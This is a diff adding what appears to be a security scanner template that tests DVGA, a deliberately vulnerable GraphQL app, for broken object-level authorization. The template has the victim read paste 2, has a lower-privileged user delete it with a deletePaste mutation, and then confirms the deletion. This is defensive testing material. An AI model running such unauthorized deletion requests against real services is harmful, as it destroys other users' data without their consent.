@@ -1,0 +1,94 @@
+# API1:2023 Broken Object Level Authorization - DVGA deletePaste Mutation (Verified)
+#
+# This template tests for BOLA vulnerabilities in DVGA's deletePaste mutation using a three-phase
+# approach that verifies mutation persistence:
+#
+# Phase 1 (setup): Read paste ID 2 as victim to confirm it exists
+# Phase 2 (attack): Attacker attempts unauthorized deletePaste mutation
+# Phase 3 (verify): Re-read paste ID 2 to confirm resource was deleted (returns null)
+#
+# Success criteria: All three phases return 200 AND verify phase shows data.paste is null
+
+id: api1-bola-delete-paste-mutation
+info:
+  name: "DVGA - BOLA via deletePaste Mutation (Verified)"
+  category: "API1:2023 Broken Object Level Authorization"
+  severity: "CRITICAL"
+  author: "hadrian"
+  description: |
+    Tests for Broken Object Level Authorization (BOLA) in DVGA's deletePaste mutation with verification.
+    The deletePaste mutation does not properly check if the authenticated user is the owner of the paste,
+    allowing attackers to delete pastes owned by other users. This template uses a three-phase approach
+    to verify the mutation actually persisted: setup confirms resource exists, attack performs unauthorized
+    deletion, and verify confirms the resource was deleted (returns null).
+  tags: ["graphql", "dvga", "bola", "authorization", "idor", "mutation", "delete"]
+  requires_llm_triage: false
+  test_pattern: "mutation"
+
+endpoint_selector:
+  requires_auth: true
+
+role_selector:
+  attacker_permission_level: "lower"
+  victim_permission_level: "higher"
+
+graphql:
+  # Phase 1: Setup - verify resource exists as victim
+  - query: |
+      query GetPaste {
+        paste(id: 2) {
+          id
+          title
+          content
+          ownerId
+        }
+      }
+    auth: "victim"
+    store_response_fields:
+      original_id: "data.paste.id"
+    matchers:
+      - type: status
+        status: [200]
+
+  # Phase 2: Attack - attacker performs unauthorized deletion
+  - query: |
+      mutation DeletePaste {
+        deletePaste(id: 2) {
+          result
+        }
+      }
+    auth: "attacker"
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["result"]
+        part: body
+
+  # Phase 3: Verify - resource was deleted (returns null)
+  - query: |
+      query VerifyPasteDeleted {
+        paste(id: 2) {
+          id
+          title
+          content
+          ownerId
+        }
+      }
+    auth: "victim"
+    matchers:
+      - type: status
+        status: [200]
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data.paste"
+      value: null
+  vulnerability_pattern: "dvga_bola_paste_deletion_verified"
+  resource_deleted: true
+  conditions:
+    - attack_phase_status: [200]
+      verify_phase_status: [200]
